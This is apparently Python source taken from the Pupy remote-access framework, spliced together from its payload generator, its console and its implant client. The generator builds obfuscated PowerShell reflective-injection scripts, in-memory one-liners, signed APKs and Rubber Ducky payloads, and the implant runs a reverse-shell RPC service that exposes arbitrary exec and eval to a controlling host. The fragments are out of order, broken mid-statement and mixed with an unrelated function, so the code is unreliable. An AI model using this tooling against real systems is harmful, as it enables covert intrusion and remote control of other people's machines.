
import platform


import cPickle

import hashlib
import uuid
from import \
     NewAESCipher as AES, \
     append_PKCS7_padding as pad, \
     strip_PKCS7_padding as unpad

try:
    import additional_imports
def time_period(start,current):
	start_hour = int(start[:start.find('h')])
 	start_minute =int(start[start.find('h')+1:])
	current_hour = int(current[:current.find(':')])
	current_minute = int(current[current.find(':')+1:])
	period = ""
	if start_hour == 0:
		start_hour = 24
	if current_hour == 0:
		current_hour = 24
	if start_hour > current_hour:
		hour =24-start_hour+current_hour
	else:
		hour = current_hour-start_hour
 	minute= abs(current_minute-start_minute)
	period=str(hour)+':'+str(minute)
	return period



except ImportError:
    pass

except Exception as e:
    logging.warning(e)

logging.getLogger().setLevel(logging.WARNING)

try:
    import pupy
except ImportError, e:
    mod = imp.new_module("pupy")
    mod.__name__ = "pupy"
    mod.__file__ = "pupy://pupy"
    mod.__package__ = "pupy"
    sys.modules["pupy"] = mod
    mod.pseudo = True

def pupygen(args, config):
    ok = colorize("[+] ","green")

    if args.workdir:
        os.chdir(args.workdir)

    script_code=""
    if args.scriptlet:
        script_code=parse_scriptlets(
            args.scriptlet,
            os=args.os,
            arch=args.arch,
            debug=args.debug_scriptlets
        )


    l = launchers[args.launcher]()
    while True:
        try:
            l.parse_args(args.launcher_args)
        except LauncherError as e:
            if str(e).strip().endswith("--host is required") and not "--host" in args.launcher_args:
                myip = get_listener_ip(external=args.prefer_external, config=config)
                if not myip:
                    raise ValueError("--host parameter missing and couldn't find your local IP. "
                                         "You must precise an ip or a fqdn manually")
                myport = get_listener_port(config, external=args.prefer_external)

                print(colorize("[!] required argument missing, automatically adding parameter "
                                   "--host {}:{} from local or external ip address".format(myip, myport),"grey"))
                args.launcher_args = [
                    '--host', '{}:{}'.format(myip, myport), '-t', config.get('pupyd', 'server')
                ]
            elif str(e).strip().endswith('--domain is required') and not '--domain' in args.launcher_args:
                domain = config.get('pupyd', 'dnscnc').split(':')[0]
                if not domain or '.' not in domain:
                    print(colorize('[!] DNSCNC disabled!', 'red'))
                    return

                print(colorize("[!] required argument missing, automatically adding parameter "
                                   "--domain {} from configuration file".format(domain),"grey"))

                args.launcher_args = [
                    '--domain', domain
                ]

            else:
                l.arg_parser.print_usage()
                return
        else:
               else:
            try:
                os.unlink(outpath)
            except:
                pass

            outfile = open(outpath, 'w+b')

        outfile.write(data)
        outfile.close()

        if makex:
            os.chmod(outfile.name, 0711)

        if args.packer:
            subprocess.check_call(
                args.packer.replace('%s', outfile.name),
                shell=True
            )

        outpath = outfile.name

    elif args.format=="py" or args.format=="pyinst":
        linux_modules = ""
        if not outpath:
            outfile = tempfile.NamedTemporaryFile(
                dir=args.output_dir or '.',
                prefix='pupy_',
                suffix='.py',
                delete=False
            )
        else:
            try:
                os.unlink(outpath)
            except:
                pass

            outfile = open(outpath, 'w+b')

        if args.format=="pyinst" :
            linux_modules = getLinuxImportedModules()
        packed_payload=pack_py_payload(get_raw_conf(conf, verbose=True))

        outfile.write("#!/usr/bin/env python\n# -*- coding: UTF8 -*-\n"+linux_modules+"\n"+packed_payload)
        outfile.close()

        outpath = outfile.name

    elif args.format=="py_oneliner":
        packed_payload=pack_py_payload(get_raw_conf(conf, verbose=True))
        i=conf["launcher_args"].index("--host")+1
        link_ip=conf["launcher_args"][i].split(":",1)[0]
        serve_payload(packed_payload, link_ip=link_ip, port=args.oneliner_listen_port)
    elif args.format=="ps1":
        SPLIT_SIZE = 100000
        x64InitCode, x86InitCode, x64ConcatCode, x86ConcatCode = "", "", "", ""
        if not outpath:
            outfile = tempfile.NamedTemporaryFile(
                dir=args.output_dir or '.',
                prefix='pupy_',
                suffix='.ps1',
                delete=False
            )
                 $PEBytesTotal = [System.Convert]::FromBase64String({3})
        }}
        Invoke-ReflectivePEInjection -PEBytes $PEBytesTotal -ForceASLR
        """#{1}=x86dll, {3}=x64dll
        binaryX64 = base64.b64encode(generate_binary_from_template(conf, 'windows', arch='x64', shared=True)[0])
        binaryX86 = base64.b64encode(generate_binary_from_template(conf, 'windows', arch='x86', shared=True)[0])
        binaryX64parts = [binaryX64[i:i+SPLIT_SIZE] for i in range(0, len(binaryX64), SPLIT_SIZE)]
        binaryX86parts = [binaryX86[i:i+SPLIT_SIZE] for i in range(0, len(binaryX86), SPLIT_SIZE)]
        for i,aPart in enumerate(binaryX86parts):
            x86InitCode += "$PEBytes{0}=\"{1}\"\n".format(i,aPart)
            x86ConcatCode += "$PEBytes{0}+".format(i)
        print(ok+"X86 dll loaded and {0} variables used".format(i+1))
        for i,aPart in enumerate(binaryX64parts):
            x64InitCode += "$PEBytes{0}=\"{1}\"\n".format(i,aPart)
            x64ConcatCode += "$PEBytes{0}+".format(i)
        print(ok+"X64 dll loaded and {0} variables used".format(i+1))
        script = obfuscatePowershellScript(open(os.path.join(ROOT, "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1"), 'r').read())
        outfile.write("{0}\n{1}".format(script, code.format(x86InitCode, x86ConcatCode[:-1], x64InitCode, x64ConcatCode[:-1]) ))
        outfile.close()
    elif args.format=="ps1_oneliner":
        from pupylib.payloads.ps1_oneliner import serve_ps1_payload
        link_ip=conf["launcher_args"][conf["launcher_args"].index("--host")+1].split(":",1)[0]
        if args.oneliner_no_ssl == False : sslEnabled = True
        else: sslEnabled = False
        if args.no_use_proxy == False : useTargetProxy = True
        else: useTargetProxy = False
        serve_ps1_payload(conf, link_ip=link_ip, port=args.oneliner_listen_port, useTargetProxy=useTargetProxy, sslEnabled=sslEnabled)
    elif args.format=="rubber_ducky":
        rubber_ducky(conf).generateAllForOStarget()
    else:
        raise ValueError("Type %s is invalid."%(args.format))

    print(ok+"OUTPUT_PATH = %s"%os.path.abspath(outpath))
    print(ok+"SCRIPTLETS = %s"%args.scriptlet)
    print(ok+"DEBUG = %s"%args.debug)
    return os.path.abspath(outpath)

if __name__ == '__main__':
    Credentials.DEFAULT_ROLE = 'CLIENT'
    check_templates_version()
    config = PupyConfig()
    parser = get_parser(argparse.ArgumentParser, config)
    try:
        pupygen(parser.parse_args(), config)
    except InvalidOptions:
        sys.exit(0)
    except EncryptionError, e:
        logging.error(e)
    except Exception, e:
        logging.exception(e)
        sys.exit(str(e))
    import pupy

pupy.infos = {}  pupy.namespace = None

def print_exception(tag=''):
    global debug

    remote_print_error = None
    dprint = None

    try:
        import pupyimporter
        remote_print_error = pupyimporter.remote_print_error
        dprint = pupyimporter.dprint
    except:
        pass

    import traceback
    trace = str(traceback.format_exc())
    error = ' '.join([ x for x in (
        tag, 'Exception:', trace
    ) if x ])

    if remote_print_error:
        try:
            remote_print_error(error)
        except Exception, e:
            pass
    elif dprint:
        dprint(error)
    elif debug:
        try:
            logging.error(error)
        except:
            print error
 print "[+] packaging the apk ... (can take 10-20 seconds)"
        updateTar(os.path.join(tempdir,"assets/private.mp3"), "pp.pyo", os.path.join(tempdir,"pp.pyo"))
        with open(os.path.join(tempdir,"assets/private.mp3"), 'r') as t:
            updateZip(tempapk, "assets/private.mp3", t.read())

        try:
            res=subprocess.check_output("jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore crypto/pupy-apk-release-key.keystore -storepass pupyp4ssword '%s' pupy_key"%tempapk, shell=True)
        except OSError as e:
            if e.errno ==os.errno.ENOENT:
                raise ValueError("Please install jarsigner first.")
            raise e
        print(res)
        content = b''
        with open(tempapk) as apk:
            return apk.read()

    finally:
        shutil.rmtree(tempdir, ignore_errors=True)
        os.unlink(tempapk)

def generate_binary_from_template(config, osname, arch=None, shared=False, debug=False, bits=None, fmt=None, compressed=True):
    TEMPLATE_FMT = fmt or 'pupy{arch}{debug}{unk}.{ext}'
    ARCH_CONVERT = {
        'amd64': 'x64', 'x86_64': 'x64',
        'i386': 'x86', 'i486': 'x86', 'i586': 'x86', 'i686': 'x86',
    }

    TO_PLATFORM = {
        'x64': 'intel',
        'x86': 'intel'
    }

    TO_ARCH = {
        'intel': {
            '32bit': 'x86',
            '64bit': 'x64'
        }
    }

    arch = arch.lower()
    arch = ARCH_CONVERT.get(arch, arch)
    if bits:
        arch = TO_ARCH[TO_PLATFORM[arch]]

    CLIENTS = {
        'android': (get_edit_apk, 'pupy.apk', False),
        'linux': (get_edit_binary, TEMPLATE_FMT, True),
        'solaris': (get_edit_binary, TEMPLATE_FMT, True),
        'windows': (get_edit_binary, TEMPLATE_FMT, False),
    }

    SUFFIXES = {
        'windows': ( 'exe', 'dll' ),
        'linux':   ( 'lin', 'lin.so' ),
        'solaris': ( 'sun', 'sun.so' ),
    }

    osname = osname.lower()

    if not osname in CLIENTS.keys():
        raise ValueError('Unknown OS ({}), known = '.format(
            osname, ', '.join(CLIENTS.keys())))

    generator, template, makex = CLIENTS[osname]

    if '{arch}' in template and not arch:
        raise ValueError('arch required for the target OS ({})'.format(osname))

    shared_ext = 'xxx'
    non_shared_ext = 'xxx'

    if osname in SUFFIXES:
        non_shared_ext, shared_ext = SUFFIXES[osname]

    debug = 'd' if debug else ''

    if shared:
        makex = False
        ext = shared_ext
    else:
        ext = non_shared_ext

    filename = template.format(arch=arch, debug=debug, ext=ext, unk='.unc' if not compressed else '')
    template = os.path.join(
        'payload_templates', filename
    )

    if not os.path.isfile(template):
        template = os.path.join(
            ROOT, 'payload_templates', filename
        )

    if not os.path.isfile(template):
        raise ValueError('Template not found ({})'.format(template))

    for k, v in config.iteritems():
        if k in ('offline_script'):
            continue

        print colorize("[C] {}: {}".format(k, v), "yellow")

    return generator(template, config, compressed), filename, makex

def load_scriptlets():
    scl={}
    for loader, module_name, is_pkg in pkgutil.iter_modules(scriptlets.__path__):
        if is_pkg:
            module=loader.find_module(module_name).load_module(module_name)
            for loader2, module_name2, is_pkg2 in pkgutil.iter_modules(module.__path__):
                if module_name2=="generator":
                    module2=loader2.find_module(module_name2).load_module(module_name2)
                    if not hasattr(module2, 'ScriptletGenerator'):
                        logging.error("scriptlet %s has no class ScriptletGenerator"%module_name2)
                    else:
                        scl[module_name]=module2.ScriptletGenerator
    return scl

def parse_scriptlets(args_scriptlet, os=None, arch=None, debug=False):
    scriptlets_dic = load_scriptlets()
    sp = scriptlets.scriptlets.ScriptletsPacker(os, arch, debug=debug)
    for sc in args_scriptlet:
        tab=sc.split(",",1)
        sc_args={}
        name=tab[0]
        if len(tab)==2:
            try:
                for x,y in [x.strip().split("=") for x in tab[1].split(",")]:
                    sc_args[x.strip()]=y.strip()
            except:
                raise ValueError("usage: pupygen ... -s %s,arg1=value,arg2=value,..."%name)

        if name not in scriptlets_dic:
            raise ValueError("unknown scriptlet %s, valid choices are : %s"%(
                repr(name), [
                    x for x in scriptlets_dic.iterkeys()
                ]))

        print colorize("[+] ","green")+"loading scriptlet %s with args %s"%(repr(name), sc_args)
        try:
            sp.add_scriptlet(scriptlets_dic[name](**sc_args))
        except ScriptletArgumentError as e:
            print(colorize("[-] ","red")+"Scriptlet %s argument error : %s"%(repr(name),str(e)))
            print("")
            print("usage: pupygen.py ... -s %s,arg1=value,arg2=value,... ..."%name)
            scriptlets_dic[name].print_help()
            raise ValueError('{}'.format(e))

    script_code=sp.pack()
    return script_code

class InvalidOptions(Exception):
    pass

class ListOptions(argparse.Action):
    def __call__(self, parser, namespace, values, option_string=None):
        print colorize("## available formats :", "green")+" usage: -f <format>"
        print "\t- client           : generate client binary"
        print "\t- py               : generate a fully packaged python file (with all the dependencies packaged and executed from memory), all os (need the python interpreter installed)"
        print "\t- pyinst           : generate a python file compatible with pyinstaller"
        print "\t- py_oneliner      : same as \"py\" format but served over http to load it from memory with a single command line."
        print "\t- ps1              : generate ps1 file which embeds pupy dll (x86-x64) and inject it to current process."
        print "\t- ps1_oneliner     : load pupy remotely from memory with a single command line using powershell."
        print "\t- rubber_ducky     : generate a Rubber Ducky script and inject.bin file (Windows Only)."
        print ""
        print colorize("## available servers :","green")+" usage: -t <server>"
        for name, tc in servers.iteritems():
            try:
                print "\t- {:<14} : {}".format(name, tc.info)
            except Exception as e:
                logging.error(e)

        print colorize("## available scriptlets :", "green")+" usage: -s <scriptlet>,<arg1>=<value>,<args2=value>..."
        scriptlets_dic=load_scriptlets()
        for name, sc in scriptlets_dic.iteritems():
            print "\t- {:<15} : ".format(name)
            print '\n'.join(["\t"+x for x in sc.get_help().split("\n")])

        raise InvalidOptions
class PStore(object):
    def __new__(cls, *args, **kw):
        if not hasattr(cls, '_instance'):
            orig = super(PStore, cls)
            cls._instance = orig.__new__(cls, *args, **kw)

        return cls._instance

    def __init__(self, pstore_dir='~'):
        try:
            import getpass
            uid = getpass.getuser()
        except:
            uid = os.getuid()

        seed = '{}:{}'.format(uid, uuid.getnode())

        h = hashlib.sha1()
        h.update(seed)

        if os.name == 'posix':
            if pstore_dir == '~':
                pstore_dir = os.path.join(pstore_dir, '.cache')
            pstore_name = '.{}'.format(h.hexdigest())
        else:
            if pstore_dir == '~':
                pstore_dir = os.path.join(
                    pstore_dir, 'AppData', 'Local', 'Temp'
                )
            pstore_name = h.hexdigest()

        self._pstore_path = os.path.expanduser(
            os.path.join(pstore_dir, pstore_name)
        )

        h = hashlib.sha1()
        h.update('password' + seed)

        self._pstore_key = (h.digest()[:16], '\x00'*16)
        self._pstore = {}

        self.load()

    def __getitem__(self, key):
        if issubclass(type(key), object):
            key = type(key).__name__
        return self._pstore.get(key)

    def __setitem__(self, key, value):
        if issubclass(type(key), object):
            key = type(key).__name__
        self._pstore[key] = value

    def load(self):
        if not os.path.exists(self._pstore_path):
            return

        data = None
        try:
            with open(self._pstore_path, 'rb') as pstore:
                data = pstore.read()

            try:
                os.unlink(self._pstore_path)
            except:
                print_exception('PS/L')

            if not data:
                return

            data = AES(*self._pstore_key).decrypt(data)
            data = unpad(data)
            data = cPickle.loads(data)
        except:
            print_exception('[PS/L]')
            return

        if type(data) == dict:
            self._pstore.update(data)

    def store(self):
        if not self._pstore:
            return

        pstore_dir = os.path.dirname(self._pstore_path)
        try:
            if not os.path.isdir(pstore_dir):
                os.makedirs(pstore_dir)

            with open(self._pstore_path, 'w+b') as pstore:
                data = cPickle.dumps(self._pstore)
                data = pad(data)
                data = AES(*self._pstore_key).encrypt(data)
                pstore.write(data)

        except:
            print_exception('
ef print_version():
    print("Pupy - %s"%(__version__))

if __name__=="__main__":
    parser = argparse.ArgumentParser(prog='pupysh', description="Pupy console")
    parser.add_argument(
        '--log-lvl', '--lvl',
        help='change log verbosity', dest='loglevel',
        choices=['DEBUG','INFO','WARNING','ERROR'],
        default='WARNING')
    parser.add_argument('--version', help='print version and exit', action='store_true')
    parser.add_argument(
        '-t', '--server',
[PS/S]')
            return

    l = launchers[conf['launcher']]()
    l.parse_args(conf['launcher_args'])

    required_credentials = set(l.credentials) \
      if hasattr(l, 'credentials') else set([])

    server = l.get_server()
    servers_list = []

    if server:
        servers_list = [ server ]
        if servers[server].credentials:
            for name in servers[server].credentials:
                required_credentials.add(name)
    elif not server:
        for n, t in servers.iteritems():
            servers_list.append(n)
    os.chdir(args.workdir)

    if args.version:
        print_version()
        exit(0)

    logging.basicConfig(format='%(asctime)-15s - %(levelname)-5s - %(message)s')
    logging.getLogger().setLevel(args.loglevel)

    PupyCredentials.DEFAULT_ROLE = 'CONTROL'
    if args.not_encrypt:
        PupyCredentials.ENCRYPTOR = None

    # Try to initialize credentials before CMD loop
    try:
        credentials = PupyCredentials.Credentials()
    except PupyCredentials.EncryptionError, e:
        logging.error(e)
        exit(1)

    config = PupyConfig()

    if args.port:
        config.set('pupyd', 'port', args.port, cmd=True)

    if args.server:
        config.set('pupyd', 'server', args.server, cmd=True)

    if args.server_args:
        config.set('pupyd', 'server_args', args.server_args, cmd=True)

    pupyServer = PupyServer(config, credentials)
    pupycmd = PupyCmdLoop(pupyServer)

    pupyServer.start()
    pupycmd.loop()
    pupyServer.stop()
    pupyServer.finished.wait()


            if t.credentials:
                for name in t.credentials:
                    required_credentials.add(name)

    print colorize("[+] ", "green") + 'Required credentials:\n{}'.format(
        colorize("[+] ", "green") + ', '.join(required_credentials)
    )

    embedded_credentials = '\n'.join([
        '{}={}'.format(credential, repr(credentials[credential])) \
        for credential in required_credentials if credentials[credential] is not None
    ])+'\n'
 config = '\n'.join([
        'pupyimporter.pupy_add_package({})'.format(
            repr(cPickle.dumps({
                'pupy_credentials.py' : embedded_credentials
            }))),
        dependencies.importer(set(
            'network.servers.{}'.format(server) for server in servers_list
        ), path=ROOT),
        'import sys',
        'sys.modules.pop("network.conf")',
        'import network.conf',
        'LAUNCHER={}'.format(repr(conf['launcher'])),
        'LAUNCHER_ARGS={}'.format(repr(conf['launcher_args'])),
        'debug={}'.format(bool(conf.get('debug', False))),
        offline_script
    ])




class Task(threading.Thread):
    stopped = None
    results_type = list

    def __init__(self, manager, *args, **kwargs):
        threading.Thread.__init__(self)
        self.daemon = True
        self._pstore = manager.pstore
        self._stopped = threading.Event()
        if not self._pstore[self]:
            self._pstore[self] = self.results_type()
        self._manager = manager
        self._dirty = False

    @server
    def name(self):
        return type(self).__name__

    @server
    def results(self):
        results = self._pstore[self]
        self._pstore[self] = self.results_type()
        self._dirty = False
        return results

    @server
    def dirty(self):
        return self._dirty

    def append(self, result):
        if self.results_type in (str, unicode):
            self._pstore[self] += result
        elif self.results_type == list:
            self._pstore[self].append(result)
        elif self.results_type == set:
            self._pstore[self].add(result)
        else:
            raise TypeError('Unknown results type: {}'.format(self.results_type))
        self._dirty = True

    def stop(self):
        if self._stopped and self.active:
            self._stopped.set()

    def run(self):
        try:
            self.task()
        except:
            print_exception('[T/R:{}]'.format(self.name))
            if self._stopped:
                self._stopped.set()

    @server
    def active(self):
        if self._stopped is None:
            return False

        try:
            return not self._stopped.is_set()

        except:
            print_exception('[T/A:{}]'.format(self.name))
            return False

    def event(self, event):
        pass

class Manager(object):
    TERMINATE = 0
    PAUSE = 1
    SESSION = 2

    def __new__(cls, *args, **kw):
        if not hasattr(cls, '_instance'):
            orig = super(Manager, cls)
            cls._instance = orig.__new__(cls, *args, **kw)

        return cls._instance

    def __init__(self, pstore):
        self.tasks = {}
        self.pstore = pstore

    def get(self, klass):
        name = klass.__name__
        return self.tasks.get(name)

    def create(self, klass, *args, **kwargs):
        name = klass.__name__
        if not name in self.tasks:
            try:
                task = klass(self, *args, **kwargs)
                task.start()
                self.tasks[name] = task
                return task

            except:
                print_exception('[M/C:{}]'.format(name))

    def stop(self, klass, force=False):
        name = klass.__name__
        if name in self.tasks:
            try:
                self.tasks[name].stop()
                del self.tasks[name]
            except:
                print_exception('[M/S:{}]'.format(name))
                if force:
                    del self.tasks[name]

    def active(self, klass=None):
        name = klass.__name__
        if name in self.tasks:
            if not self.tasks[name].stopped:
]                del self.tasks[name]
                return False

            return self.tasks[name].stopped.is_set()
        else:
            return False

    @server
    def status(self):
        return {
            name:{
                'active': task.active,
                'results': task.dirty,
            } for name,task in self.tasks.iteritems()
        }

    def event(self, event):
        for task in self.tasks.itervalues():
            try:
                task.event(event)
            except:
                print_exception('[M/E:{}:{}]'.format(task.name, event))

        if event == self.TERMINATE:
            for task in self.tasks.itervalues():
                try:
                    task.stop()
                except:
                    print_exception('[M/E:{}:{}]'.format(task.name, event))

            self.pstore.store()

setattr(pupy, 'manager', Manager(PStore()))
setattr(pupy, 'Task', Task)

def safe_obtain(proxy):
    """ safe version of rpyc's rpyc.utils.classic.obtain, without using pickle. """
    if type(proxy) in [list, str, bytes, dict, set, type(None)]:
        return proxy
    conn = object.__getattribute__(proxy, "____conn__")()
    return json.loads(
        zlib.decompress(
            conn.root.json_dumps(proxy, compressed=True)
        )
    ) def obtain(proxy):
    """ allows to convert netref types into python native types """
    return safe_obtain(proxy)

debug = False

setattr(pupy, 'obtain', obtain) REVERSE_SLAVE_CONF = dict(
    allow_all_attrs=True,
    allow_public_attrs=True,
    allow_pickle=True,
    allow_getattr=True,
    allow_setattr=True,
    allow_delattr=True,
    import_custom_exceptions=False,
    propagate_SystemExit_locally=True,
    propagate_KeyboardInterrupt_locally=True,
    instantiate_custom_exceptions=True,
    instantiate_oldstyle_exceptions=True,
)

class UpdatableModuleNamespace(ModuleNamespace):
    __slots__ = ['__invalidate__']

    def __invalidate__(self, name):
        cache = self._ModuleNamespace__cache
        if name in cache:
            del cache[name]

class ReverseSlaveService(Service):
    """ Pupy reverse shell rpyc service """
    __slots__ = ["exposed_namespace", "exposed_cleanups"]

    def on_connect(self):
        self.exposed_namespace = {}
        self.exposed_cleanups = []
        self._conn._config.update(REVERSE_SLAVE_CONF)

        pupy.namespace = UpdatableModuleNamespace(self.exposed_getmodule)
        self._conn.root.set_modules(pupy.namespace)

    def on_disconnect(self):
        for cleanup in self.exposed_cleanups:
            try:
                cleanup()
            except Exception as e:
                print_exception('[D]')

        self.exposed_cleanups = []

        try:
            self._conn.close()
        except Exception as e:
            print_exception('[DC]')

        if os.name == 'posix':
            try:
                pid = os.waitpid(-1, os.WNOHANG)
                attempt = 0
                while pid != 0 and attempt < 1024:
                    pid = os.waitpid(-1, os.WNOHANG)
                    attempt += 1

            except OSError:
                pass


    def exposed_exit(self):
        try:
            return True
        finally:
            os._exit(0)

    def exposed_register_cleanup(self, method):
        self.exposed_cleanups.append(method)

    def exposed_unregister_cleanup(self, method):
        self.exposed_cleanups.remove(method)

    def exposed_execute(self, text):
        """execute arbitrary code (using ``exec``)"""
        execute(text, self.exposed_namespace)

    def exposed_get_infos(self, s=None):
        import pupy

        if not s:
            return {
                k:v for k,v in pupy.infos.iteritems() if not k in (
                    'launcher_inst',
                )
            }

        if s not in pupy.infos:
            return None

        return pupy.infos[s]

    def exposed_eval(self, text):
        """evaluate arbitrary code (using ``eval``)"""
        return eval(text, self.exposed_namespace)

    def exposed_getmodule(self, name):
        """imports an arbitrary module"""
        return __import__(name, None, None, "*")

    def exposed_json_dumps(self, obj, compressed=False):
        try:
            data = json.dumps(obj, ensure_ascii=False)
        except:
            try:
                import locale
                data = json.dumps(
                    obj,
                    ensure_ascii=False,
                    encoding=locale.getpreferredencoding()
                )
            except:
                data = json.dumps(
                    obj,
                    ensure_ascii=False,
                    encoding='latin1'
                )

        if compressed:
            if type(data) == unicode:
                data = data.encode('utf-8')

            data = zlib.compress(data)

        return data

    def exposed_getconn(self):
        """returns the local connection instance to the other side"""
        return self._conn


class BindSlaveService(ReverseSlaveService):

    def on_connect(self):
        self.exposed_namespace = {}
        self.exposed_cleanups = []
        self._conn._config.update(REVERSE_SLAVE_CONF)
        import pupy
        try:
            from pupy_credentials import BIND_PAYLOADS_PASSWORD
            password = BIND_PAYLOADS_PASSWORD
        except:
            from pupylib.PupyCredentials import Credentials
            credentials = Credentials()
            password = credentials['BIND_PAYLOADS_PASSWORD']

        if self._conn.root.get_password() != password:
            self._conn.close()
            raise KeyboardInterrupt("wrong password")

        pupy.namespace = UpdatableModuleNamespace(self.exposed_getmodule)
        self._conn.root.set_modules(pupy.namespace)

def get_next_wait(attempt):
    if attempt < 120:
        return random.randint(5, 10) / 10.0
    elif attempt < 320:
        return random.randint(30, 50) / 10.0
    else:
        return random.randint(150, 300) / 10.0


def set_connect_back_host(HOST):
    import pupy
    pupy.get_connect_back_host = (lambda: HOST)

def handle_sigchld(*args, **kwargs):
    os.waitpid(-1, os.WNOHANG)

def handle_sighup(*args):
    pass

def handle_sigterm(*args):
    try:
        if hasattr(pupy, 'manager'):
            pupy.manager.event(Manager.TERMINATE)

    except:
        print_exception('[ST]')

    os._exit(0)

attempt = 0

def main():
    global LAUNCHER
    global LAUNCHER_ARGS
    global debug
    global attempt

    try:
        if hasattr(signal, 'SIGHUP'):
            signal.signal(signal.SIGHUP, handle_sighup)
        if hasattr(signal, 'SIGTERM'):
            signal.signal(signal.SIGTERM, handle_sigterm)
    except:
        print_exception('[MS]')

    if hasattr(pupy, 'set_exit_session_callback'):
        pupy.set_exit_session_callback(handle_sigterm)

    if len(sys.argv) > 1:
        parser = argparse.ArgumentParser(
            prog='pp.py',
            formatter_class=argparse.RawTextHelpFormatter,
                    parser.add_argument(
            '--debug',
            action='store_true',
            help="increase verbosity")
        parser.add_argument(
            'launcher',
            choices=[
                x for x in conf.launchers],
            help="the launcher to use")
        parser.add_argument(
            'launcher_args',
            nargs=argparse.REMAINDER,
            help="launcher arguments")
        args = parser.parse_args()

        if not debug:
            debug = bool(args.debug)

        LAUNCHER = args.launcher
        LAUNCHER_ARGS = shlex.split(' '.join(args.launcher_args))

    if hasattr(pupy, 'get_pupy_config'):
        try:
            config_file = pupy.get_pupy_config()
            exec config_file in globals()
        except ImportError, e:
            logging.warning(
                "ImportError: Couldn't load pupy config: {}".format(e))

    if LAUNCHER not in conf.launchers:
        exit("No such launcher: %s" % LAUNCHER)

    if debug:
        logging.getLogger().setLevel(logging.DEBUG)

    launcher = conf.launchers[LAUNCHER]()

    try:
        launcher.parse_args(LAUNCHER_ARGS)
    except LauncherError as e:
        launcher.arg_parser.print_usage()
        os._exit(str(e))

    if getattr(pupy, 'pseudo', False):
        set_connect_back_host(launcher.get_host())
    else:
        pupy.get_connect_back_host = launcher.get_host

    pupy.infos['launcher'] = LAUNCHER
    pupy.infos['launcher_args'] = LAUNCHER_ARGS
    pupy.infos['launcher_inst'] = launcher
    pupy.infos['server'] = launcher.get_server()
    pupy.infos['debug'] = debug
    pupy.infos['native'] = not getattr(pupy, 'pseudo', False)
    pupy.infos['revision'] = getattr(pupy, 'revision', None)

    exited = False

    while not exited:
        try:
            rpyc_loop(launcher)

        except Exception as e:
            print_exception('[ML]')

            if type(e) == SystemExit:
                exited = True

        finally:
            if not exited:
                time.sleep(get_next_wait(attempt))
                attempt += 1


def rpyc_loop(launcher):
    global attempt
    global debug

    stream=None
    for ret in launcher.iterate():
        try:
            if isinstance(ret, tuple):                 s = server_class(
                    BindSlaveService,
                    port=port,
                    hostname=address,
                    authenticator=authenticator,
                    stream=stream,
                    server=server,
                    server_kwargs=server_kwargs,
                    pupy_srv=None,
                )
                s.start()

            else: 
                stream = ret

                def check_timeout(event, cb, timeout=60):
                    time.sleep(timeout)
                    if not event.is_set():
                        logging.error('timeout occured!')
                        cb()

                event = threading.Event()
                t = threading.Thread(
                    target=check_timeout, args=(
                        event, stream.close))
                t.daemon = True
                t.start()

                lock = threading.RLock()
                conn = None

                try:
                    conn = PupyConnection(
                        lock, None, ReverseSlaveService,
                        PupyChannel(stream), config={}
                    )
                    conn._init_service()
                finally:
                    event.set()

                attempt = 0
                with lock:
                    while not conn.closed:
                        interval, timeout = conn.get_pings()
                        conn.serve(interval or 10)
                        if interval:
                            conn.ping(timeout=timeout)

        except SystemExit:
            raise

        except EOFError:
            pass

        except:
            print_exception('[M]')

        finally:
            if stream is not None:
                try:
                    stream.close()
                except:
                    pass

if __name__ == "__main__":
    main()
else:
    import platform
    if not platform.system() == 'android':
        if not hasattr(platform, 'pupy_thread'):
           
            t = threading.Thread(target=main)
            t.daemon = True
            t.start()
            setattr(platform, 'pupy_thread', t)
